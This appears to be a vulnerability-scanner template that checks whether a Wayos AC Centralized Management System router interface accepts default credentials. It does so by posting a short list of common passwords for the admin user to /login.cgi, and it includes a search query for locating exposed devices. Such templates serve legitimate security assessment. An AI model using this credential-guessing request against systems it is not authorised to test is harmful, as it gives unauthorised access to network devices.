id: ac-default-login
info:
  name: AC Centralized Management System - Default password
  author: SleepingBag945
  severity: high
  description: |
    AC Centralized Management System default login credentials were discovered.
  reference:
    - https://github.com/Ershu1/2021_Hvv/blob/main/Wayos%20AC%E9%9B%86%E4%B8%AD%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%BC%B1%E5%8F%A3%E4%BB%A4.md
    - https://github.com/chaitin/xray/blob/master/pocs/secnet-ac-default-password.yml
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)安网科技-智能路由系统"})
    fofa-query: title="安网科技-智能路由系统"
    max-request: 1
    verified: "true"
  tags: default-login,vuln,ways-ac
http:
  - attack: pitchfork
    matchers:
      - condition: and
        part: header
        type: word
        words:
          - ac_userid=admin
          - ac_passwd=
      - condition: and
        part: body
        type: word
        words:
          - window.open
          - text/javascript
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - admin
        - 123456
        - 12345678
        - password
      username:
        - admin
    raw:
      - |
        POST /login.cgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{ password }}&Submit=%E7%99%BB%E5%BD%95
    stop-at-first-match: true
